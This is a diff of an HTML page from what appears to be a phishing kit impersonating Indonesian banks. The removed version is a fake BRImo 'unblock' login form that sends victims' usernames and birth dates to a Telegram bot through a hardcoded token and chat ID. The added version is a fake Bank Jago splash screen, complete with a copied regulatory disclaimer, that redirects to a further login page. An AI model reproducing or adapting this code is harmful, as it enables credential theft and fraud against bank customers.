@@ -3,188 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BRImo Mobile- Buka Blokir</title>
+    <title>Jago</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
-            background-color: #FFFFFF;
+            background-color: #FAF3E8;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 30px;
+            padding: 40px 30px;
+            overflow: hidden;
         }
 
-        .login-container {
-            width: 100%;
-            max-width: 360px;
-        }
-
-        /* Logo BRI */
         .logo-container {
             text-align: center;
-            margin-bottom: 50px;
+            animation: fadeInUp 1.5s ease-out forwards;
+            opacity: 0;
         }
 
-        .logo-bri {
-            font-size: 34px;
-            font-weight: 900;
-            color: #00529B;
-            letter-spacing: 1px;
-        }
-
-        .logo-mobile {
-            font-size: 26px;
+        .logo {
+            font-size: 80px;
             font-weight: 600;
-            color: #FF6A00;
-            margin-top: -4px;
+            color: #FF9F1C;
+            letter-spacing: -2px;
+            position: relative;
+            display: inline-block;
+            animation: gentlePulse 2.5s ease-in-out infinite alternate;
         }
 
-        /* Form Input */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .input-row {
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #CCCCCC;
-            padding: 8px 0;
-        }
-
-        .input-icon {
-            font-size: 16px;
-            color: #666666;
-            margin-right: 10px;
-        }
-
-        .input-row input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 15px;
-            color: #333333;
-            background: transparent;
-        }
-
-        .input-row input::placeholder {
-            color: #AAAAAA;
-        }
-
-        /* Tombol Login */
-        .btn-login {
-            width: 100%;
-            background-color: #002366;
-            color: #FFFFFF;
-            border: none;
-            padding: 13px;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        .btn-login:hover {
-            background-color: #003399;
-        }
-
-        .loading {
+        .footer-text {
+            position: fixed;
+            bottom: 40px;
             text-align: center;
-            margin-top: 15px;
-            color: #00529B;
-            display: none;
-            font-size: 14px;
+            max-width: 340px;
+            animation: fadeIn 2s ease-out 0.8s forwards;
+            opacity: 0;
+        }
+
+        .footer-text p {
+            font-size: 13px;
+            color: #8B7D6B;
+            line-height: 1.6;
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes gentlePulse {
+            0% {
+                transform: scale(1);
+                filter: drop-shadow(0 0 0 transparent);
+            }
+            100% {
+                transform: scale(1.05);
+                filter: drop-shadow(0 4px 12px rgba(255, 159, 28, 0.25));
+            }
+        }
+
+        .sparkle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background-color: #FF9F1C;
+            border-radius: 50%;
+            opacity: 0;
+            animation: sparkle 4s ease-in-out infinite;
+        }
+
+        @keyframes sparkle {
+            0%, 100% {
+                opacity: 0;
+                transform: scale(0);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(1);
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <!-- Logo -->
-        <div class="logo-container">
-            <div class="logo-bri">BRImo</div>
-            <div class="logo-mobile">mobile</div>
-        </div>
+    <div class="sparkle" style="top: 20%; left: 15%; animation-delay: 0s;"></div>
+    <div class="sparkle" style="top: 30%; right: 20%; animation-delay: 1s;"></div>
+    <div class="sparkle" style="top: 60%; left: 25%; animation-delay: 2s;"></div>
+    <div class="sparkle" style="top: 70%; right: 15%; animation-delay: 3s;"></div>
 
-        <!-- Form -->
-        <form id="loginForm">
-            <div class="form-group">
-                <div class="input-row">
-                    <span class="input-icon">👤</span>
-                    <input type="text" id="username" placeholder="Username" required>
-                </div>
-            </div>
-
-            <!-- ✅ Kolom Tanggal Lahir Baru -->
-            <div class="form-group">
-                <div class="input-row">
-                    <span class="input-icon">🎂</span>
-                    <input type="date" id="tgl_lahir" required>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-login">LOGIN</button>
-        </form>
-
-        <div class="loading" id="loading">Mengirim data...</div>
+    <div class="logo-container">
+        <div class="logo">Jago</div>
     </div>
 
+    <div class="footer-text">
+        <p>PT Bank Jago Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) dan Bank Indonesia, serta merupakan peserta penjaminan LPS.</p>
+    </div>
+
+    <!-- ✅ Pindah ke loginjago.html setelah 2 detik -->
     <script>
-        // === SETTING TELEGRAM BOT ===
-        const BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
-        const CHAT_ID ="8592742129";
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        // Kirim data ke Telegram & pindah halaman
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const tgl_lahir = document.getElementById('tgl_lahir').value;
-            const loading = document.getElementById('loading');
-            const btn = document.querySelector('.btn-login');
-            
-            loading.style.display = 'block';
-            btn.disabled = true;
-            btn.textContent = 'MEMPROSES...';
-
-            const pesan = `🔐 DATA LOGIN BRIMO
-
-👤 Username: ${username}
-📅 Tanggal Lahir: ${tgl_lahir}
-🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
-
-            try {
-                await fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: pesan,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                // ✅ Berhasil -> Pindah ke halaman index3.html
-                window.location.href = 'index3.html';
-                
-            } catch (error) {
-                alert('❌ Gagal mengirim! Cek koneksi internet.');
-                console.error(error);
-                loading.style.display = 'none';
-                btn.disabled = false;
-                btn.textContent = 'LOGIN';
-            }
-        });
+        setTimeout(function() {
+            window.location.href = 'loginjago.html';
+        }, 2000);
     </script>
 </body>
 </html>
